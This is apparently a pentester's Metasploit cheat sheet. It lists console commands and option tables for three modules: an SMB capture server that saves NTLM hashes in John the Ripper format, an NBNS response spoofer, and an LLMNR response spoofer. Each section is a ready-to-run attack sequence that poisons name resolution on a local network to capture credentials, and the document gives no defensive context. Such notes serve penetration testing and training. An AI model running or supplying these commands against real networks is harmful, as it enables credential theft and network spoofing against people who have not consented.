# Metasploit

## 01 - SMB Server

^0c8cfd

```
msf > use auxiliary/server/capture/smb

msf auxiliary(server/capture/smb) > options

Module options (auxiliary/server/capture/smb):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CHALLENGE                    no        The 8 byte server challenge. Set values must be a valid 16 character hexadecimal pattern.
                                          If unset a valid random challenge is used.
   JOHNPWFILE                   no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of
                                          which is stored in separate files. Can also be a path.
   SMBDomain   WORKGROUP        yes       The domain name used during SMB exchange.
   SRVHOST     0.0.0.0          yes       The local host to listen on.
   SRVPORT     445              yes       The local port to listen on.
   TIMEOUT     5                yes       Seconds that the server socket will wait for a response after the client has initiated com
                                          munication.


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run SMB capture server



View the full module info with the info, or info -d command.

msf auxiliary(server/capture/smb) > set johnpwfile <hashes.txt>

msf auxiliary(server/capture/smb) > set srvhost <IP>

msf auxiliary(server/capture/smb) > set srvport <PORT>

msf auxiliary(server/capture/smb) > run -j
```

## 02 - NetBIOS Name Service Spoofer

```
msf > use auxiliary/spoof/nbns/nbns_response

Module options (auxiliary/spoof/nbns/nbns_response):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   REGEX      .*               yes       Regex applied to the NB Name to determine if spoofed reply is sent
   SPOOFIP    127.0.0.1        yes       IP address with which to poison responses
   TIMEOUT    500              yes       The number of seconds to wait for new data


Auxiliary action:

   Name     Description
   ----     -----------
   Service  Run NBNS spoofing service



View the full module info with the info, or info -d command.

msf auxiliary(spoof/nbns/nbns_response) > set interface <interface>

msf auxiliary(spoof/nbns/nbns_response) > set spoofip <spoof_IP>

msf auxiliary(spoof/nbns/nbns_response) > set regex <regular_expression>

msf auxiliary(spoof/nbns/nbns_response) > run
```

## 03 - LLMNR

```
msf > use auxiliary/spoof/llmnr/llmnr_response

msf auxiliary(spoof/llmnr/llmnr_response) > options

Module options (auxiliary/spoof/llmnr/llmnr_response):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   REGEX      .*               yes       Regex applied to the LLMNR Name to determine if spoofed reply is sent
   SPOOFIP                     yes       IP address with which to poison responses
   TIMEOUT    500              yes       The number of seconds to wait for new data
   TTL        30               no        Time To Live for the spoofed response


Auxiliary action:

   Name     Description
   ----     -----------
   Service  Run LLMNR spoofing service



View the full module info with the info, or info -d command.

msf auxiliary(spoof/llmnr/llmnr_response) > set interface <interface>

msf auxiliary(spoof/llmnr/llmnr_response) > set spoofip <spoof_IP>

msf auxiliary(spoof/llmnr/llmnr_response) > set regex <regular_expression>

msf auxiliary(spoof/llmnr/llmnr_response) > run
```